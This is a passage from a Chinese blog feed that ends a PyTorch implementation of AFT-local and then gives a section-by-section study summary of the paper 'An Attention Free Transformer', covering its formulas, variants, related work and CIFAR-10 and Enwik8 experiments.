class="number">2</span>] == <span class="number">1</span> <span class="keyword">or</span> mask.shape[<span class="number">2</span>] == query.shape[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        query = <span class="variable language_">self</span>.query(query)</span><br><span class="line">        key = <span class="variable language_">self</span>.key(key)</span><br><span class="line">        value = <span class="variable language_">self</span>.value(value)</span><br><span class="line"></span><br><span class="line">        pos_bias = <span class="variable language_">self</span>.pos_bias[:seq_len, :seq_len] * <span class="variable language_">self</span>.local_mask[:seq_len, :seq_len]</span><br><span class="line">        pos_bias = pos_bias.unsqueeze(-<span class="number">1</span>)</span><br><span class="line">        pos_bias.masked_fill_(~mask, <span class="built_in">float</span>(<span class="string">&#x27;-inf&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        max_key = key.<span class="built_in">max</span>(dim=<span class="number">0</span>, keepdims=<span class="literal">True</span>)[<span class="number">0</span>]</span><br><span class="line">        max_pos_bias = pos_bias.<span class="built_in">max</span>(dim=<span class="number">1</span>, keepdims=<span class="literal">True</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        exp_key = torch.exp(key - max_key)</span><br><span class="line">        exp_pos_bias = torch.exp(pos_bias - max_pos_bias)</span><br><span class="line"></span><br><span class="line">        num = torch.einsum(<span class="string">&#x27;ijb,jbd-&gt;ibd&#x27;</span>, exp_pos_bias, exp_key * value)</span><br><span class="line">        den = torch.einsum(<span class="string">&#x27;ijb,jbd-&gt;ibd&#x27;</span>, exp_pos_bias, exp_key)</span><br><span class="line"></span><br><span class="line">        y = <span class="variable language_">self</span>.activation(query) * num / den</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.output(y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_test_local_mask</span>():</span><br><span class="line">    <span class="keyword">from</span> labml.logger <span class="keyword">import</span> inspect</span><br><span class="line">    inspect(AFTLocal.create_local_mask(<span class="number">10</span>, <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    _test_local_mask()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AFT </tag>
            
            <tag> 论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文精读1：An Attention Free Transformer</title>
      <link href="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/"/>
      <url>/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Abstract"><a href="#1-Abstract" class="headerlink" title="1 Abstract"></a>1 Abstract</h1><p>我们介绍了无注意力transformer(AFT)，这是Transformer的有效变体，消除了对点积自注意力的需要。在AFT层中，键和值首先与<strong>一组学习到的位置偏置组合</strong>在一起，其结果以element-wise的方式与查询相乘。</p><p>这个新操作的内存复杂度与上下文大小和特征维度都是<strong>线性</strong>的，这使得它兼容于大的输入和模型大小。我们还介绍了<code>AFT-local</code>和<code>AFT-conv</code>两种模型变体，它们在保持全局连通性的同时利用了局域性和空间权重共享的思想。</p><p>我们在两个自回归建模任务(<code>CIFAR10</code>和<code>Enwik8</code>)以及图像识别任务(<code>ImageNet-1K</code>分类)上进行了广泛的实验。实验表明，AFT在所有基准测试中都表现出具有竞争力的性能，同时提供了出色的效率。</p><hr><h1 id="2-Introduction"><a href="#2-Introduction" class="headerlink" title="2 Introduction"></a>2 Introduction</h1><p>以Transformers为代表的自注意机制推动了各种机器学习问题的发展，包括语言理解和计算机视觉应用。与卷积神经网络(<code>cnn</code>)或循环神经网络(<code>rnn</code>)等经典模型架构不同，Transformer可以在序列中的<strong>每对元素之间进行直接交互</strong>，这使得它们在捕获长期依赖关系方面特别强大。</p><p>然而，Transformer需要很高的计算成本。这一挑战的原因是需要执行<strong>具有平方时间和空间复杂性的注意力操作，而不是上下文大小</strong>。</p><blockquote><p>因为设计到矩阵乘法，所以时间复杂度为平方级别</p></blockquote><p>这使得Transformer难以扩展到具有大上下文大小的输入。最近的许多工作都致力于解决Transformer的可伸缩性问题。这里的共同思想是<strong>近似全局注意力操作</strong>，使用的技术包括稀疏性、局域敏感散列、低秩分解、核近似等。</p><p>在本文中，我们提出了一个不使用或近似标准点积注意力的计算模块。因此，我们将我们的模型命名为无注意力Transformer(AFT)。与点积注意力类似，AFT由查询、键和值(Q、K、V)三个量的交互作用组成。不同之处在于，在AFT中，键和值（上下文）首先组合在一起加上一系列学习到的position biases。然后将查询与简化后的上下文结合起来，使用element-wise乘法，图2给出了一个说明。</p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_It0lGwCQEV.png"></p><p>AFT保持上下文中任意两点之间的直接交互，这是<strong>点积注意力</strong>的主要优势。事实上，AFT可以被解释为在<strong>注意力头的数量与模型的特征维度相同</strong>的情况下计算注意力，而attention maps不需要明确计算(详见3.1节)。这导致内存复杂度线性w.r.t。输入和模型大小。</p><blockquote><p>注意力图：Q与K进行点积得到的矩阵</p></blockquote><p>在最近的“线性化注意力”工作中也发现了Q、K、V的重新排列计算顺序。不同之处在于，AFT以element-wise方式结合了K和V，而所有的线性注意力论文都依赖于矩阵点积。后一种方法导致复杂度与模型的特征维数成二次方，这对大模型尺寸不友好。与其他Transformer相比，AFT的复杂度分析见表1。</p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_UBBu-YZrFr.png"></p><p>根据经验，我们观察到经过训练的Transformer往往表现出广泛的局部模式（见图1）。这促使我们提出AFT的两种变体：<strong>AFT-local</strong>和<strong>AFT-conf</strong>。</p><p>在<code>AFT-local</code>中，学习到的位置偏置被限制在局部区域，同时保持全局连通性。</p><p>在<code>AFT-conv</code>中通过强制空间权重共享进一步扩展了这一设计，有效地使其成为具有全局感受野的CNN的变体。</p><p>我们证明，<strong>局部约束不仅提供了更好的参数和计算效率，而且大大提高了模型在所有任务中的性能</strong>。</p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_EW8FkS0sEz.png"></p><p>我们用AFT进行了图像自回归建模、字符级语言建模和图像分类任务的实验。我们证明，AFT提供了具有竞争力的性能，通常与标准变压器和其他变体相匹配或击败，同时提供了卓越的效率。</p><p>我们还对AFT的几种设计选择进行了广泛的消融研究，并讨论了其独特的特性，如与Transformer的兼容性、稀疏性和可变大小的输入。</p><hr><h1 id="3-Multi-Head-Attention"><a href="#3-Multi-Head-Attention" class="headerlink" title="3 Multi-Head Attention"></a>3 Multi-Head Attention</h1><p>Transformer的核心是Multi-Head Attention（<code>MHA</code>）操作。在自注意模式中，给定输入序列$X \in R^{T \times d}$，头的数量为h，<code>MHA</code>对每个头$i$执行缩放的点积注意，定义为：</p><p>$$<br>f_{i}(X)&#x3D;\sigma\left(\frac{Q_{i}\left(K_{i}\right)^{T}}{\sqrt{d_{k}}}\right) V_{i}, s.t. Q_{i}&#x3D;X W_{i}^{Q}, K_{i}&#x3D;X W_{i}^{K}, V_{i}&#x3D;X W_{i}^{V},<br>$$</p><p>$$<br>f_{i}(X)&#x3D;\sigma\left(\frac{Q_{i}\left(K_{i}\right)^{T}}{\sqrt{d_{k}}}\right) V_{i}, i&#x3D;1,2,…h<br>$$</p><p>其中$W_{i}^{Q} \in R^{d \times d_{k}}$，$W_{i}^{K} \in R^{d \times d_{k}}$，$W_{i}^{V} \in R^{d \times d_{v}}$是头$i$的线性变换，$\sigma$是默认设置为<code>softmax</code>函数的非线性（应用于矩阵的每一行）。$d_k$和$d_v$分别是键和值的维度。<code>MHA</code>沿着通道维度连接$h$个注意力头的输出，从而产生特征维度$hd_v$。除非另有说明，否则我们假设$d_k&#x3D;d_v$和$h&#x3D;d_k$。这意味着查询、键和值在每个头中都是相同的维度，并且输出维度与输入维度匹配。为什么要有这个假设？</p><hr><h1 id="4-Methodology"><a href="#4-Methodology" class="headerlink" title="4 Methodology"></a>4 Methodology</h1><h2 id="4-1-Attention-Free-Transformer"><a href="#4-1-Attention-Free-Transformer" class="headerlink" title="4.1 Attention Free Transformer"></a>4.1 Attention Free Transformer</h2><p>之前的注意力机制：</p><p>$$<br>\operatorname{Attention}(\mathrm{Q}, \mathrm{K}, \mathrm{V})&#x3D;\operatorname{Softmax}\left(\frac{\mathrm{QK}^{\mathrm{T}}}{\sqrt{\mathrm{d}_{\mathrm{k}}}}\right) \mathrm{V}<br>$$</p><p>我们现在定义了Attention Free Transformer（AFT），它是<code>MHA</code>的插件替代品，无需更改Transformer的其他架构方面。给定输入$X$，AFT首先将其线性变换为$Q&#x3D;X W^{Q}, K&#x3D;X W^{K}, V&#x3D;X W^{V}$（这部分和之前的注意力机制计算相同），然后执行以下操作：</p><p>$$<br>Y&#x3D;f(X) ; Y_{t}&#x3D;\sigma_{q}\left(Q_{t}\right) \odot \frac{\sum_{t^{\prime}&#x3D;1}^{T} \exp \left(K_{t^{\prime}}+w_{t, t^{\prime}}\right) \odot V_{t^{\prime}}}{\sum_{t^{\prime}&#x3D;1}^{T} \exp \left(K_{t^{\prime}}+w_{t, t^{\prime}}\right)}<br>$$</p><p>其中$\odot$是元素乘积；$σ_q$是应用于查询非线性，默认为<code>sigmoid</code>；$w \in R^{T \times T}$是学习到的成对位置偏差（见图2）。</p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_I1ajEwCNi6.png"></p><p>换句话说，对于每个目标位置$t$，AFT计算$V$的加权平均，其结果与具有element-wise乘法的$Q$相结合。特别地，权重仅由键和一组学习的成对位置偏差$w$组成。这提供了直接的优势，即不需要计算和存储昂贵的注意力矩阵，同时像<code>MHA</code>那样保持查询和值之间的全局交互。</p><p>为了进一步了解AFT与<code>MHA</code>的关系，我们可以将上述公式改写为：</p><p>$$<br>Y_{t}^{i}&#x3D;&lt;a_{t}^{i}, V^{i}&gt;, s.t. a_{t}^{i}&#x3D;\frac{\sigma_{q}\left(Q_{t}^{i}\right) \exp \left(K^{i}+w_{t}\right)}{\sum_{t^{\prime}&#x3D;1}^{T} \exp \left(K_{t^{\prime}}^{i}+w_{t, t^{\prime}}\right)}, i&#x3D;1,2, \ldots, d, t&#x3D;1,2, \ldots, T<br>$$</p><p>这里我们使用上标$i$来索引矩阵的特征维度；$&lt;·，·&gt;$表示向量的点积。在这种重新排列的形式中，我们能够再次用注意力来表达AFT。</p><p>具体来说，对于每个位置，我们对每个维度都有一个注意力向量$a_{t}^{i} \in R^{T}$，由$Q,K,w$组成。换句话说，<strong>AFT可以被解释为用与特征维度一样多的头来执行隐含注意力</strong>，其中注意力矩阵采用因式分解形式。</p><h2 id="4-2-AFT-变体"><a href="#4-2-AFT-变体" class="headerlink" title="4.2 AFT 变体"></a>4.2 AFT 变体</h2><h3 id="4-2-1-AFT-Full"><a href="#4-2-1-AFT-Full" class="headerlink" title="4.2.1 AFT-Full"></a>4.2.1 AFT-Full</h3><p>我们将上述公式中定义的AFT的基本版本表示为AFT-Full。</p><h3 id="4-2-2-AFT-Local"><a href="#4-2-2-AFT-Local" class="headerlink" title="4.2.2 AFT-Local"></a>4.2.2 AFT-Local</h3><p>在许多应用中，局部性是一种重要的归纳偏置，<code>CNNs</code>和最近Transformer的相关工作已经利用了这一点。此外，我们发现经过训练的标准Transformer往往表现出广泛的局部注意力模式。具体地说，我们可视化了<code>ImagenetNet</code>预训练的视觉转换器（<code>ViT</code>），它由12层组成，每个层有6个头。</p><p>为了可视化，我们忽略分类标记，并将每一层的注意力张量重塑为6×196×196（<code>ViT</code>的特征图的空间大小为14×14）。然后，我们从ImageNet验证集中采样了256幅图像。对于每一层和每一个头，我们计算查询位置和图像的平均相对二维关注度。这导致了一组大小为12×6×27×273的注意力图。</p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_EW8FkS0sEz.png"></p><p>在图1中展示了每2层的注意力（完整可视化见附录）。我们看到，相对注意力图表现出强烈的局部性（如清晰度所示），尤其是在较低的层中。这激发了AFT的一种变体，称为<code>AFT-local</code>，其中我们只在局部应用一组学习到的相对位置偏差：</p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image.png"></p><p>这里$s \leq T$是局部窗口大小。<code>AFT-local</code>提供了进一步的计算节省，包括参数数量和时间&#x2F;空间复杂性。注意，与<code>local Transformer</code>不同，无论窗口大小s如何，AFT-local都保持全局连通性。在实验中，我们验证了这种设计选择的有效性。</p><h3 id="4-2-3-AFT-Simple"><a href="#4-2-3-AFT-Simple" class="headerlink" title="4.2.3 AFT-Simple"></a>4.2.3 AFT-Simple</h3><p><code>AFT-local</code>的一种极端形式是当$s&#x3D;0$（窗口为0）时，即没有学习到位置偏差。这就产生了一个极其简单的AFT版本，其中我们有：</p><p>$$<br>Y_{t}&#x3D;\sigma_{q}\left(Q_{t}\right) \odot \frac{\sum_{t^{\prime}&#x3D;1}^{T} \exp \left(K_{t^{\prime}}\right) \odot V_{t^{\prime}}}{\sum_{t^{\prime}&#x3D;1}^{T} \exp \left(K_{t^{\prime}}\right)}&#x3D;\sigma_{q}\left(Q_{t}\right) \odot \sum_{t^{\prime}&#x3D;1}^{T}(\operatorname{softmax}(K) \odot V)_{t^{\prime}}.<br>$$</p><p>在这个版本中，上下文缩减被进一步简化为元素操作和全局池。<code>AFT-simple</code>类似于线性化注意力，其公式为：</p><p>$$<br>Y_t&#x3D;\frac{\phi\left(Q_{t}\right) \sum_{t^{\prime}&#x3D;1}^{T}\left(\phi\left(K_{t^{\prime}}\right)^{T} V_{t^{\prime}}\right)}{\phi\left(Q_{t}\right) \sum_{t^{\prime}&#x3D;1}^{T} \phi\left(K_{t}\right)^{T}}<br>$$</p><p>然而，很容易看出，<code>AFT-simple</code>完全消除了点积运算的需要，这导致时间复杂度为$O(Td)$而不是$O(Td^2)$。</p><h3 id="4-2-4-AFT-Conv"><a href="#4-2-4-AFT-Conv" class="headerlink" title="4.2.4 AFT-Conv"></a>4.2.4 AFT-Conv</h3><p>我们还可以进一步扩展局部性的概念，将空间权重共享（即卷积）纳入其中。这种变体与视觉任务特别相关，因为通常需要将预训练的模型扩展到可变大小的输入。具体来说，我们让$w_{t, t^{\prime}}$的值仅取决于$t$和$t’$，即相对于给定空间网格（<code>1d</code>或<code>2d</code>）的相对位置。与<code>CNNs</code>类似，我们也可以学习多组位置偏差（我们重用<code>heads</code>的概念作为参考）。为了说明<code>#parameters</code>随着<code>#heads</code>的增加而增长，我们采用了一种设计选择来将<code>K</code>的维度与<code>#heads</code>联系起来。这使得AFT可修改为依赖于深度可分离卷积、全局池和元素操作的实现。</p><p>我们现在展示了具有<code>1d</code>输入的<code>AFT-conv</code>的示例，<code>2d</code>和<code>3d</code>输入可以类似地导出。我们将模型配置表示为<code>AFT-conv-h-s</code>，其中$h$是头的数量，$s$是<code>1d</code>局部窗口大小。我们现在有$w \in R^{h \times s}$，$Q, V \in R^{T \times h \times \frac{d}{h}}$，$K \in R^{T \times h}$。对于每个头部$i&#x3D;1,2, \ldots, h$，我们有：</p><p>$$<br>Y_{t}^{i}&#x3D;\sigma_{q}\left(Q_{t}^{i}\right) \odot \frac{\operatorname{conv1d}\left(\exp \left(K^{i}\right) \odot V^{i}, \exp \left(w^{i}\right)-1\right)+\sum_{t^{\prime}&#x3D;1}^{T} \exp \left(K_{t^{i}}^{i}\right) \odot V_{t^{\prime}}^{i}}{\operatorname{conv1d}\left(\exp \left(K^{i}\right), \exp \left(w^{i}\right)-1\right)+\sum_{t^{\prime}&#x3D;1}^{T} \exp \left(K_{t^{i}}^{i}\right)}.<br>$$</p><p>这里$Y_{t}^{i} \in R^{\frac{d}{h}}$、$Q^{i}, V^{i} \in R^{T \times \frac{d}{h}}$、$K^{i} \in R^{T}$、$w^{i} \in R^{s}$；</p><p>$conv1d(x,w)$是深度可分离的一维卷积运算，其中卷积滤波器$w$在通道维度上共享。请注意，上述公式可以很容易地理解为具有：</p><ol><li>全局连接性</li><li>非负卷积权重</li><li>复杂的除法&#x2F;乘法门控机制的专用卷积层</li></ol><p>通过实验证明，所有三个方面都对 <code>AFT-conv</code>的性能有显着贡献。</p><h3 id="4-2-5-参数化"><a href="#4-2-5-参数化" class="headerlink" title="4.2.5 参数化"></a>4.2.5 参数化</h3><p>参数化。根据经验，我们发现正确参数化位置偏差$w$很重要。对于<code>AFT-full</code>和<code>AFT-local</code>，我们采用 𝑤的因式分解形式：</p><p>$$<br>w_{t, t^{\prime}}&#x3D;u_{t}^{T} v_{t}^{\prime}, u \in R^{T \times d^{\prime}}, v \in R^{T \times d^{\prime}}<br>$$</p><p>其中 𝑑’是一个小的嵌入维度（例如 128）。这种简单的分解不仅大大减少了参数数量（$2Td$与$T^2$），而且还根据经验提高了模型在训练和测试中的性能。</p><p>对于<code>AFT-conv</code>，分解技巧不适用。相反，采用简单的重新参数化，对于每个头$i$，我们让</p><p>$$<br>w^{i}&#x3D;\gamma^{i} \frac{w^{i}-\operatorname{mean}\left(w^{i}\right)}{\operatorname{std}\left(w^{i}\right)}+\beta^{i}<br>$$</p><p>其中$\gamma \in R^{h}, \beta \in R^{h}$是可学习的增益和偏置参数，均初始化为0。</p><hr><h1 id="5-Related-Work"><a href="#5-Related-Work" class="headerlink" title="5 Related Work"></a>5 Related Work</h1><p>自从Transformer被引入以来，已经有很多尝试来解决架构中低效的主要来源，即注意力操作的平方成本。改进此操作可以实现更大的上下文大小和更高效的实现。有关高效Transformer的最新全面调查，请参阅[16]。</p><h2 id="5-1-近似点积"><a href="#5-1-近似点积" class="headerlink" title="5.1 近似点积"></a>5.1 近似点积</h2><p>近似点积提出用投影的内积来近似指数核，这导致了复杂性为$O(Td^2)$的线性化注意力操作。</p><p>然而，这些模型的$d^2$项使其难以随模型大小进行缩放，这对AFT来说不是问题。Reformers[8]将<code>LSH</code>作为点积的近似值，其中AFT完全消除了它。</p><h2 id="5-2-稀疏注意力"><a href="#5-2-稀疏注意力" class="headerlink" title="5.2 稀疏注意力"></a>5.2 稀疏注意力</h2><p>稀疏Transformer[7]和图像Transformer[17]提出使用固定的稀疏或局部上下文模式。视觉任务中的注意力模型（通常与卷积相结合）使用图像结构来帮助手工制作相关的空间模式来参与[18-22]。AFT局部性也借用了<strong>局部性</strong>的思想，但我们把它看作是一种偏见，而不是硬约束。这允许<code>AFT-local/AFT-conv</code>利用完整的上下文，而不是仅依赖于子集。</p><h2 id="5-3-上下文压缩"><a href="#5-3-上下文压缩" class="headerlink" title="5.3 上下文压缩"></a>5.3 上下文压缩</h2><p>其他方法试图学习上下文模式。Adaptive-Span Transformers[23]学习每个注意力头的范围。[24]使用聚类仅在同一聚类内的元素子集上计算点积注意力。</p><p><code>Linformer</code>[10]通过使用线性层压缩键和值来减少上下文的长度。压缩变换器[9]计算并更新输入序列中足够靠后的输入的简化表示，并处理这些压缩表示。AFT在很大程度上是对这些方法的补充，因为我们的重点是从操作层面提高任何给定序列的复杂性。</p><h2 id="5-4-消除点积注意力"><a href="#5-4-消除点积注意力" class="headerlink" title="5.4 消除点积注意力"></a>5.4 消除点积注意力</h2><p>其他方法不是限制比较的次数，而是改变用于计算注意力的运算。合成器[12]使用从输入预测的注意力权重，而不是从点积交互中导出的。[25]中引入的<code>LightConv</code>模块提出用动态轻量级深度卷积代替点积自注意，其中权重在时间维度上进行归一化。<code>Sinkhorn</code> Transformer [26]使用可微分排序操作来识别在原始序列顺序中可能不是局部的相关比较。AFT沿着这条线提供了一种不同的方法，同时强调了强大的实证性能和效率。</p><h2 id="5-5-MLPs-for-vision"><a href="#5-5-MLPs-for-vision" class="headerlink" title="5.5 MLPs for vision"></a>5.5 MLPs for vision</h2><p>并行工作[27，28]探讨了在视觉任务中使用<code>MLP</code>代替注意力操作。虽然AFT可以用类似的方式查看，但它也配备了更复杂的门控机制。特别是，值的权重由关键和位置偏差组成，这些偏差被归一化为非负值（类似于注意力）。</p><p>AFT将成为现有变压器的插件模块，无需任何架构更改和额外调整。此外，<code>AFT-conv</code>继承了<code>CNNs</code>的宝贵特性，使其能够实现卓越的参数效率、强大的性能以及处理可变大小输入的能力。</p><hr><h1 id="6-Experiments"><a href="#6-Experiments" class="headerlink" title="6 Experiments"></a>6 Experiments</h1><p>我们在三个任务上进行了实验：图像自回归建模（第6.1节）、字符级语言建模（第6.2节）和图像分类（第6.3节）。前两个基准使用AFT的因果模型（或解码器模型），而最后一个基准使用编码模型。所有实验都是以即插即用的方式设计的，其中我们获得了特定任务的基线Transformer架构，并将注意力模块替换为AFT模块。初始化、学习速率调度等超参数也直接继承自Transformer对应方法。</p><p>除非另有说明，否则所有实验都是在<code>8×V100</code> GPU机器上进行的。</p><h2 id="6-1-图像自回归建模"><a href="#6-1-图像自回归建模" class="headerlink" title="6.1 图像自回归建模"></a>6.1 图像自回归建模</h2><h3 id="6-1-1-CIFAR-10数据集"><a href="#6-1-1-CIFAR-10数据集" class="headerlink" title="6.1.1 CIFAR-10数据集"></a>6.1.1 CIFAR-10数据集</h3><ul><li>数据集链接：<a href="https://www.cs.toronto.edu/~kriz/cifar.html" title="CIFAR-10 和 CIFAR-100 数据集 --- CIFAR-10 and CIFAR-100 datasets (toronto.edu)">CIFAR-10 和 CIFAR-100 数据集 — CIFAR-10 and CIFAR-100 datasets (toronto.edu)</a></li></ul><p><code>CIFAR-10</code> 和 <code>CIFAR-100</code> 是 8000 万个微小图像数据集的标记子集。它们由 Alex Krizhevsky、Vinod Nair 和 Geoffrey Hinton 收集。</p><p><code>CIFAR-10</code>数据集由 10 个类别的 60000 个<code>32x32</code>彩色图像组成，每个类别有 6000 个图像。有 50000 张训练图像和 10000 张测试图像。</p><p>数据集分为5个训练批次和1个测试批次，每个批次有10000张图像。测试批次包含从每个类别中随机选择的 1000 张图像。训练批次以随机顺序包含剩余的图像，但某些训练批次可能包含来自一个类的图像多于另一个类的图像。在它们之间，训练批次正好包含来自每个类的 5000 张图像。</p><p>以下是数据集中的类，以及每个类的 10 张随机图像：</p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_b3k5kxewGD.png"></p><p>这些类是完全相互排斥的。汽车和卡车之间没有重叠。“汽车”包括轿车、SUV等。“卡车”仅包括大型卡车。两者都不包括皮卡车。</p><h3 id="6-1-2-实验部分"><a href="#6-1-2-实验部分" class="headerlink" title="6.1.2 实验部分"></a>6.1.2 实验部分</h3><p>在我们的第一组实验中，我们通过<strong>最小化负对数似然</strong>（<code>NLL</code>）来考虑图像自回归建模的问题。与[17]类似，我们将<code>RGB</code>图像表示为长度为H×W×3的序列，其中H、W分别为高度和宽度。每个子像素被表示为256路离散变量。我们使用<code>CIFAR-10</code>作为基准数据集。</p><p>我们的参考Transformer设计在很大程度上遵循[4]的设计，其中Transformer块由具有残差连接的注意力层（在我们的情况下为AFT层）和具有残差连接（前馈维度乘数设置为4）的2层<code>MLP</code>组成。层规范化（LN）[29]以“预先”的方式应用。我们采用学习的位置嵌入，并在<code>RGB</code>上使用一组共享的标记嵌入和预测头。我们在本实验中使用带有因子化参数化的AFT局部。因子分解的隐藏维度为64，u，v用$N(0,10^{−2})$初始化；局部（<code>1d</code>）窗口大小s为256。</p><p>我们使用<code>AdamW</code>[30]，并遵循[1]中的标准热身学习率时间表。我们使用$3×10^{−3}$的初始学习率，将0.1的权重衰减应用于所有线性变换权重，并使用0.1的丢弃率。我们采用简单的数据扩充。在训练过程中，我们首先随机水平翻转每个图像，然后从其所有子像素中添加或减去范围为[-10, 10]的值，并将得到的像素值剪裁为[0255]。我们使用交叉熵损失，对于200个训练时期，默认批量大小为128。</p><h4 id="与现有技术相比"><a href="#与现有技术相比" class="headerlink" title="与现有技术相比"></a><strong>与现有技术相比</strong></h4><p><code>CIFAR10</code>是图像自回归建模的一个拥挤的基准，我们将其与一些有竞争力的基线进行了比较，如表2所示。注意，<code>CIFAR10</code>具有3072的展开序列长度，这已经无法训练具有合理尺寸的完整变压器。对于标准的Transformer模型，我们采用了两种配置（L&#x3D;12，d&#x3D;512，h&#x3D;4和L&#x3D;24，d&#x3D;256，h&#x3D;2），批量大小为32，这是我们在<code>8xV100</code>GPU节点上可以容纳的最大的一个。另一个基线是Image Transformer[17]，它将注意力限制在大小为256的<code>local2d</code>窗口上。我们还将其与稀疏变换器[7]进行了比较，后者限制了对上下文元素的预先指定的稀疏子集的关注。</p><blockquote><p><strong>表2</strong>：<code>CIFAR-10</code>上的<code>NLL</code>结果，按bits&#x2F;dim评估，越低越好。速度和内存是在训练期间测量的，8个<code>V100</code>GPU的批量大小为32。AFT在此设置中实现了最先进的结果，与标准Transformer、Sparse Transformer[7]和Image Transformer[17]相比，写入速度和内存显著提高。</p></blockquote><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_tO4Y6krXmk.png"></p><p>从表2中，我们可以看到AFT local优于所有Transformer baseline。我们还观察到，更深但更窄的架构比浅但宽的基线更有效。在这种情况下，我们最好的模型在<code>CIFAR10</code>上也达到了最先进的结果，优于更大的稀疏变压器模型。在效率方面，我们在8 个<code>V100</code>GPU节点上将Transformer变体与AFT进行了基准测试。我们所有的变体都比标准Transformer和Image Transformer更快，同时只消耗一半的内存。也许令人惊讶的是，AFT simple也实现了非常有竞争力的性能，甚至超过了Image Transformer，同时提供了出色的速度和内存效率。</p><p><strong>因子分解的影响</strong>。我们还提供了关于AFT因子化参数化的消融实验。为了做到这一点，我们用一个初始参数化的w重新训练了表2中性能最好的模型（即AFT-cal-256，L&#x3D;24，d&#x3D;256），用$N(0,0.01)$初始化。从表3中，我们可以看出，因子化版本不仅显著节省了参数，而且提高了模型在训练和测试方面的性能。</p><h4 id="6-1-2-2-Factorized的影响"><a href="#6-1-2-2-Factorized的影响" class="headerlink" title="6.1.2.2 Factorized的影响"></a>6.1.2.2 Factorized的影响</h4><p>我们还提供了关于AFT因子化参数化作用的消融。为了做到这一点，我们用一个初始参数化的$w$重新训练了表2中性能最好的模型（即AFT-cal-256，L&#x3D;24，d&#x3D;256），用$N(0,10^{−2})$初始化。从表3中，我们可以看出，因子化版本不仅显著节省了参数，而且提高了模型在训练和测试方面的性能。</p><p>表3：通过对<code>CIFAR-10</code>的$w$自回归建模评估的位置偏差因子化参数化的影响</p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_KwDCjpOpmc.png"></p><h2 id="6-2-语言建模"><a href="#6-2-语言建模" class="headerlink" title="6.2 语言建模"></a>6.2 语言建模</h2><h3 id="6-2-1-补充"><a href="#6-2-1-补充" class="headerlink" title="6.2.1 补充"></a>6.2.1 补充</h3><p>语言建模是预测文档中下一个单词或字符的任务。此技术可用于训练语言模型，这些模型可以进一步应用于广泛的自然语言任务，如文本生成、文本分类和问答。</p><p>模型的语言建模能力是使用交叉熵和困惑度来衡量的。一些用于评估语言建模的数据集包括 WikiText-103、One Billion Word、Text8、C4、The Pile 等。</p><h3 id="6-2-2-Enwik8数据集"><a href="#6-2-2-Enwik8数据集" class="headerlink" title="6.2.2 Enwik8数据集"></a>6.2.2 Enwik8数据集</h3><p><code>Enwik8</code>数据集是 2006 年 3 月 3 日英语维基百科 XML 转储的前 100,000,000 （<code>100M</code>）字节，通常用于<strong>衡量模型压缩数据</strong>的能力。</p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_5FT6M2KOyC.png"></p><h3 id="6-2-3-实验部分"><a href="#6-2-3-实验部分" class="headerlink" title="6.2.3 实验部分"></a>6.2.3 实验部分</h3><p>我们将AFT应用于<code>Enwik8</code>[31]上的字符级语言建模，这是另一个流行的自回归建模基准。我们遵循[32]中的标准预处理程序和训练&#x2F;验证&#x2F;测试拆分。我们的基础Transformer参考是一个12层512维8头架构，具有2048个前馈维度。对于第一组实验，我们使用1024的序列长度。我们的训练方案与之前的实验基本相同，只是我们将权重衰减增加到0.5，并以128的批量训练100个时期。我们评估窗口大小为32和$d’&#x3D;256$的AFT-local。</p><p>我们还比较了几种有效的Transformer模型，即Reformer[8]、Synthesizer[12]、Linear Transformer[11]和Performer[13]。</p><blockquote><p><strong>表4</strong>：<code>Enwik8</code>结果，以每字符比特数（<code>bpc</code>）为单位测量，越低越好。比较的基线是Reformer[8]、Synthesizer[12]（其性能最好的密集版本）、Linear Transformer[11]和Performer[13]。L、d、h、T分别表示块的数量（深度）、特征的尺寸、头的数量和序列长度<br>速度和内存是在训练时间内测量的，在8个 <code>V100</code>GPU节点上的批量大小为128。Linear Transformer和Performer都是用定制的<code>CUDA</code>内核（<a href="http://github.com/idiap/fast-transformers" title="github.com/idiap/fast-transformers">github.com&#x2F;idiap&#x2F;fast-transformers</a> ）实现的，所有其他模型都是在原生<code>Pytorch</code>中实现的</p></blockquote><p><img 